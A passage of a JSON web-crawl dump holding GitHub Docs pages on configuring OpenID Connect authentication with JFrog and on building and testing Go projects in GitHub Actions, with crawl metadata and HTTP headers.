      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-verifying-attestations-offline-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-verifying-attestations-offline-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-verifying-attestations-offline-readableTextIfPossibleHtmlUr"
    },
    "lengths": {
      "extractus": 4920,
      "readableText": 4448,
      "none": 22976,
      "readableTextIfPossible": 22976,
      "result": 4448,
      "markdown": 3496
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog",
    "loadedTime": "2025-05-08T06:37:23.237Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog",
    "title": "Configuring OpenID Connect in JFrog - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with JFrog.",
    "author": null,
    "keywords": "Security,Actions",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in JFrog - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8400:68D95:2A5B:3823:681C5108",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:15 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686236.614626, VS0, VE239",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27550",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in JFrog\nUse OpenID Connect within your workflows to authenticate with JFrog.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with JFrog to download and publish artifacts without storing JFrog passwords, tokens, or API keys in GitHub.\nThis guide gives an overview of how to configure JFrog to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in a GitHub Actions workflow.\nFor an example GitHub Actions workflow, see Sample GitHub Actions Integration in the JFrog documentation.\nFor an example GitHub Actions workflow using the JFrog CLI, see build-publish.yml in the jfrog-github-oidc-example repository.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nTo be secure, you need to set a Claims JSON in JFrog when configuring identity mappings. For more information, see AUTOTITLE and About security hardening with OpenID Connect.\nFor example, you can set iss to https://token.actions.githubusercontent.com, and the repository to something like \"octo-org/octo-repo\"`. This will ensure only Actions workflows from the specified repository will have access to your JFrog platform. The following is an example Claims JSON when configuring identity mappings.\nJSON\n{ \"iss\": \"https://token.actions.githubusercontent.com\", \"repository\": \"octo-org/octo-repo\" } \nAdding the identity provider to JFrog\nTo use OIDC with JFrog, establish a trust relationship between GitHub Actions and the JFrog platform. For more information about this process, see OpenID Connect Integration in the JFrog documentation.\nSign in to your JFrog Platform.\nConfigure trust between JFrog and your GitHub Actions workflows.\nConfigure identity mappings.\nUpdating your GitHub Actions workflow\nOnce you establish a trust relationship between GitHub Actions and the JFrog platform, you can update your GitHub Actions workflow file.\nIn your GitHub Actions workflow file, ensure you are using the provider name and audience you configured in the JFrog Platform.\nThe following example uses the placeholder YOUR_PROVIDER_NAME.\n- name: Fetch Access Token from Artifactory id: fetch_access_token env: ID_TOKEN: $ run: | ACCESS_TOKEN=$(curl \\ -X POST \\ -H \"Content-type: application/json\" \\ https://example.jfrog.io/access/api/v1/oidc/token \\ -d \\ \"{\\\"grant_type\\\": \\\"urn:ietf:params:oauth:grant-type:token-exchange\\\", \\\"subject_token_type\\\":\\\"urn:ietf:params:oauth:token-type:id_token\\\", \\\"subject_token\\\": \\\"$ID_TOKEN\\\", \\\"provider_name\\\": \\\"YOUR_PROVIDER_NAME\\\"}\" | jq .access_token | tr -d '\"') echo ACCESS_TOKEN=$ACCESS_TOKEN >> $GITHUB_OUTPUT \nThe following example shows part of a GitHub Actions workflow file using cURL.\n- name: Get ID Token (cURL method) id: idtoken run: | ID_TOKEN=$(curl -sLS -H \"User-Agent: actions/oidc-client\" -H \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \\ \"${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github\" | jq .value | tr -d '\"') echo \"ID_TOKEN=${ID_TOKEN}\" >> $GITHUB_OUTPUT \nAlternatively, you can set the audience as an environment variable using the env context. For more information about the env context, see Accessing contextual information about workflow runs.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\njobs: build: runs-on: ubuntu-latest env: OIDC_AUDIENCE: 'YOUR_AUDIENCE' \nThen, in your workflow file, retrieve the value of the variables stored in the env context. The following example uses the env context to retrieve the OIDC audience.\n- name: Get ID Token (using env context) uses: actions/github-script@v7 id: idtoken with: script: | const coredemo = require('@actions/core'); let id_token = await coredemo.getIDToken(process.env.OIDC_AUDIENCE); coredemo.setOutput('id_token', id_token);",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-jfrog-lr7pkh.html",
  "markdown": "# Configuring OpenID Connect in JFrog\n\nUse OpenID Connect within your workflows to authenticate with JFrog.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with [JFrog](https://jfrog.com/) to download and publish artifacts without storing JFrog passwords, tokens, or API keys in GitHub.\n\nThis guide gives an overview of how to configure JFrog to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in a GitHub Actions workflow.\n\nFor an example GitHub Actions workflow, see [Sample GitHub Actions Integration](https://jfrog.com/help/r/jfrog-platform-administration-documentation/sample-github-actions-integration) in the JFrog documentation.\n\nFor an example GitHub Actions workflow using the JFrog CLI, see [`build-publish.yml`](https://github.com/jfrog/jfrog-github-oidc-example/blob/main/.github/workflows/build-publish.yml) in the `jfrog-github-oidc-example` repository.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n*   To be secure, you need to set a Claims JSON in JFrog when configuring identity mappings. For more information, see [AUTOTITLE](https://jfrog.com/help/r/jfrog-platform-administration-documentation/configure-identity-mappings) and [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#customizing-the-token-claims).\n    \n    For example, you can set `iss` to `https://token.actions.githubusercontent.com`, and the `repository` to something like \"octo-org/octo-repo\"\\`. This will ensure only Actions workflows from the specified repository will have access to your JFrog platform. The following is an example Claims JSON when configuring identity mappings.\n    \n    JSON\n    \n    ```\n    {\n      \"iss\": \"https://token.actions.githubusercontent.com\",\n      \"repository\": \"octo-org/octo-repo\"\n    }\n    ```\n    \n\n## [Adding the identity provider to JFrog](#adding-the-identity-provider-to-jfrog)\n\nTo use OIDC with JFrog, establish a trust relationship between GitHub Actions and the JFrog platform. For more information about this process, see [OpenID Connect Integration](https://jfrog.com/help/r/jfrog-platform-administration-documentation/openid-connect-integration) in the JFrog documentation.\n\n1.  Sign in to your JFrog Platform.\n2.  Configure trust between JFrog and your GitHub Actions workflows.\n3.  Configure identity mappings.\n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nOnce you establish a trust relationship between GitHub Actions and the JFrog platform, you can update your GitHub Actions workflow file.\n\nIn your GitHub Actions workflow file, ensure you are using the provider name and audience you configured in the JFrog Platform.\n\nThe following example uses the placeholder `YOUR_PROVIDER_NAME`.\n\n```\n- name: Fetch Access Token from Artifactory\n        id: fetch_access_token\n        env:\n          ID_TOKEN: $\n        run: |\n          ACCESS_TOKEN=$(curl \\\n          -X POST \\\n          -H \"Content-type: application/json\" \\\n          https://example.jfrog.io/access/api/v1/oidc/token \\\n          -d \\\n          \"{\\\"grant_type\\\": \\\"urn:ietf:params:oauth:grant-type:token-exchange\\\", \\\"subject_token_type\\\":\\\"urn:ietf:params:oauth:token-type:id_token\\\", \\\"subject_token\\\": \\\"$ID_TOKEN\\\", \\\"provider_name\\\": \\\"YOUR_PROVIDER_NAME\\\"}\" | jq .access_token | tr -d '\"')\n          echo ACCESS_TOKEN=$ACCESS_TOKEN >> $GITHUB_OUTPUT\n```\n\nThe following example shows part of a GitHub Actions workflow file using cURL.\n\n```\n- name: Get ID Token (cURL method)\n        id: idtoken\n        run: |\n          ID_TOKEN=$(curl -sLS -H \"User-Agent: actions/oidc-client\" -H \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \\\n          \"${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github\" | jq .value | tr -d '\"')\n          echo \"ID_TOKEN=${ID_TOKEN}\" >> $GITHUB_OUTPUT\n```\n\nAlternatively, you can set the audience as an environment variable using the `env` context. For more information about the `env` context, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts#env-context).\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    env:\n      OIDC_AUDIENCE: 'YOUR_AUDIENCE'\n```\n\nThen, in your workflow file, retrieve the value of the variables stored in the `env` context. The following example uses the `env` context to retrieve the OIDC audience.\n\n```\n- name: Get ID Token (using env context)\n        uses: actions/github-script@v7\n        id: idtoken\n        with:\n          script: |\n            const coredemo = require('@actions/core');\n            let id_token = await coredemo.getIDToken(process.env.OIDC_AUDIENCE);\n            coredemo.setOutput('id_token', id_token);\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 240,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-jfrog-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-jfrog-removedElements",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-jfrog-extractusHtmlUr",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-jfrog-readableTextHtm",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-jfrog-readableTextIfP"
    },
    "lengths": {
      "extractus": 8328,
      "readableText": 7862,
      "none": 26643,
      "readableTextIfPossible": 26643,
      "result": 7862,
      "markdown": 6203
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-go",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-go",
    "loadedTime": "2025-05-08T06:37:30.412Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-go",
    "title": "Building and testing Go - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow to build and test your Go project.",
    "author": null,
    "keywords": "CI",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Go - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-go"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-go"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "6C08:C34F8:580D:727A:681C5123",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:23 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686243.225988, VS0, VE267",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29055",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Go - GitHub Docs\nYou can create a continuous integration (CI) workflow to build and test your Go project.\nIntroduction\nThis guide shows you how to build, test, and publish a Go package.\nGitHub-hosted runners have a tools cache with preinstalled software, which includes the dependencies for Go. For a full list of up-to-date software and the preinstalled versions of Go, see Using GitHub-hosted runners.\nPrerequisites\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see Workflow syntax for GitHub Actions.\nWe recommend that you have a basic understanding of the Go language. For more information, see Getting started with Go.\nUsing a Go workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a Go workflow template that should work for most Go projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"go\".\nFilter the selection of workflows by clicking Continuous integration.\nOn the \"Go - by GitHub Actions\" workflow, click Configure.\nEdit the workflow as required. For example, change the version of Go.\nClick Commit changes.\nThe go.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying a Go version\nThe easiest way to specify a Go version is by using the setup-go action provided by GitHub. For more information see, the setup-go action.\nTo use a preinstalled version of Go on a GitHub-hosted runner, pass the relevant version to the go-version property of the setup-go action. This action finds a specific version of Go from the tools cache on each runner, and adds the necessary binaries to PATH. These changes will persist for the remainder of the job.\nThe setup-go action is the recommended way of using Go with GitHub Actions, because it helps ensure consistent behavior across different runners and different versions of Go. If you are using a self-hosted runner, you must install Go and add it to PATH.\nUsing multiple versions of Go\nYAML\nname: Go on: [push] jobs: build: runs-on: ubuntu-latest strategy: matrix: go-version: [ '1.19', '1.20', '1.21.x' ] steps: - uses: actions/checkout@v4 - name: Setup Go ${{ matrix.go-version }} uses: actions/setup-go@v5 with: go-version: ${{ matrix.go-version }} # You can test your matrix by printing the current Go version - name: Display Go version run: go version \nUsing a specific Go version\nYou can configure your job to use a specific version of Go, such as 1.20.8. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest patch release of Go 1.21:\nYAML\n- name: Setup Go 1.21.x uses: actions/setup-go@v5 with: # Semantic version range syntax or exact version of Go go-version: '1.21.x' \nInstalling dependencies\nYou can use go get to install dependencies:\nYAML\nsteps: - uses: actions/checkout@v4 - name: Setup Go uses: actions/setup-go@v5 with: go-version: '1.21.x' - name: Install dependencies run: | go get . go get example.com/octo-examplemodule go get example.com/octo-examplemodule@v1.3.4 \nCaching dependencies\nYou can cache and restore dependencies using the setup-go action. By default, caching is enabled when using the setup-go action.\nThe setup-go action searches for the dependency file, go.sum, in the repository root and uses the hash of the dependency file as a part of the cache key.\nYou can use the cache-dependency-path parameter for cases when multiple dependency files are used, or when they are located in different subdirectories.\nYAML\n- name: Setup Go uses: actions/setup-go@v5 with: go-version: '1.17' cache-dependency-path: subdir/go.sum \nIf you have a custom requirement or need finer controls for caching, you can use the cache action. For more information, see Caching dependencies to speed up workflows.\nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code. This example workflow demonstrates how to use go build and go test in a job:\nYAML\nname: Go on: [push] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Setup Go uses: actions/setup-go@v5 with: go-version: '1.21.x' - name: Install dependencies run: go get . - name: Build run: go build -v ./... - name: Test with the Go CLI run: go test \nPackaging workflow data as artifacts\nAfter a workflow completes, you can upload the resulting artifacts for analysis. For example, you may need to save log files, core dumps, test results, or screenshots. The following example demonstrates how you can use the upload-artifact action to upload test results.\nFor more information, see Storing and sharing data from a workflow.\nYAML\nname: Upload Go test results on: [push] jobs: build: runs-on: ubuntu-latest strategy: matrix: go-version: [ '1.19', '1.20', '1.21.x' ] steps: - uses: actions/checkout@v4 - name: Setup Go uses: actions/setup-go@v5 with: go-version: ${{ matrix.go-version }} - name: Install dependencies run: go get . - name: Test with Go run: go test -json > TestResults-${{ matrix.go-version }}.json - name: Upload Go test results uses: actions/upload-artifact@v4 with: name: Go-results-${{ matrix.go-version }} path: TestResults-${{ matrix.go-version }}.json",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-go-0wfg0i.html",
  "markdown": "# Building and testing Go - GitHub Docs\n\nYou can create a continuous integration (CI) workflow to build and test your Go project.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to build, test, and publish a Go package.\n\nGitHub-hosted runners have a tools cache with preinstalled software, which includes the dependencies for Go. For a full list of up-to-date software and the preinstalled versions of Go, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#preinstalled-software).\n\n## [Prerequisites](#prerequisites)\n\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions).\n\nWe recommend that you have a basic understanding of the Go language. For more information, see [Getting started with Go](https://golang.org/doc/tutorial/getting-started).\n\n## [Using a Go workflow template](#using-a-go-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a Go workflow template that should work for most Go projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"go\".\n    \n5.  Filter the selection of workflows by clicking **Continuous integration**.\n    \n6.  On the \"Go - by GitHub Actions\" workflow, click **Configure**.\n    \n    ![Screenshot of the \"Choose a workflow\" page. The \"Configure\" button on the \"Go\" workflow is highlighted with an orange outline.](https://docs.github.com/assets/cb-101514/images/help/actions/starter-workflow-go.png)\n    \n7.  Edit the workflow as required. For example, change the version of Go.\n    \n8.  Click **Commit changes**.\n    \n    The `go.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n## [Specifying a Go version](#specifying-a-go-version)\n\nThe easiest way to specify a Go version is by using the `setup-go` action provided by GitHub. For more information see, the [`setup-go` action](https://github.com/actions/setup-go/).\n\nTo use a preinstalled version of Go on a GitHub-hosted runner, pass the relevant version to the `go-version` property of the `setup-go` action. This action finds a specific version of Go from the tools cache on each runner, and adds the necessary binaries to `PATH`. These changes will persist for the remainder of the job.\n\nThe `setup-go` action is the recommended way of using Go with GitHub Actions, because it helps ensure consistent behavior across different runners and different versions of Go. If you are using a self-hosted runner, you must install Go and add it to `PATH`.\n\n### [Using multiple versions of Go](#using-multiple-versions-of-go)\n\nYAML\n\n```\nname: Go\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        go-version: [ '1.19', '1.20', '1.21.x' ]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go ${{ matrix.go-version }}\n        uses: actions/setup-go@v5\n        with:\n          go-version: ${{ matrix.go-version }}\n      # You can test your matrix by printing the current Go version\n      - name: Display Go version\n        run: go version\n```\n\n### [Using a specific Go version](#using-a-specific-go-version)\n\nYou can configure your job to use a specific version of Go, such as `1.20.8`. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest patch release of Go 1.21:\n\nYAML\n\n```\n      - name: Setup Go 1.21.x\n        uses: actions/setup-go@v5\n        with:\n          # Semantic version range syntax or exact version of Go\n          go-version: '1.21.x'\n```\n\n## [Installing dependencies](#installing-dependencies)\n\nYou can use `go get` to install dependencies:\n\nYAML\n\n```\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: '1.21.x'\n      - name: Install dependencies\n        run: |\n          go get .\n          go get example.com/octo-examplemodule\n          go get example.com/octo-examplemodule@v1.3.4\n```\n\n### [Caching dependencies](#caching-dependencies)\n\nYou can cache and restore dependencies using the [`setup-go` action](https://github.com/actions/setup-go). By default, caching is enabled when using the `setup-go` action.\n\nThe `setup-go` action searches for the dependency file, `go.sum`, in the repository root and uses the hash of the dependency file as a part of the cache key.\n\nYou can use the `cache-dependency-path` parameter for cases when multiple dependency files are used, or when they are located in different subdirectories.\n\nYAML\n\n```\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: '1.17'\n          cache-dependency-path: subdir/go.sum\n```\n\nIf you have a custom requirement or need finer controls for caching, you can use the [`cache` action](https://github.com/marketplace/actions/cache). For more information, see [Caching dependencies to speed up workflows](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows).\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code. This example workflow demonstrates how to use `go build` and `go test` in a job:\n\nYAML\n\n```\nname: Go\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: '1.21.x'\n      - name: Install dependencies\n        run: go get .\n      - name: Build\n        run: go build -v ./...\n      - name: Test with the Go CLI\n        run: go test\n```\n\n## [Packaging workflow data as artifacts](#packaging-workflow-data-as-artifacts)\n\nAfter a workflow completes, you can upload the resulting artifacts for analysis. For example, you may need to save log files, core dumps, test results, or screenshots. The following example demonstrates how you can use the `upload-artifact` action to upload test results.\n\nFor more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts).\n\nYAML\n\n```\nname: Upload Go test results\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        go-version: [ '1.19', '1.20', '1.21.x' ]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: ${{ matrix.go-version }}\n      - name: Install dependencies\n        run: go get .\n      - name: Test with Go\n        run: go test -json > TestResults-${{ matrix.go-version }}.json\n      - name: Upload Go test results\n        uses: actions/upload-artifact@v4\n        with:\n          name: Go-results-${{ matrix.go-version }}\n          path: TestResults-${{ matrix.go-version }}.json\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 252,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-go-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-go-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-go-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-go-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-go-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 13188,
      "readableText": 12333,
      "none": 40771,
      "readableTextIfPossible": 12333,
      "result": 12333,
      "markdown": 7623
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi",
    "loadedTime": "2025-05-08T06:37:27.519Z",
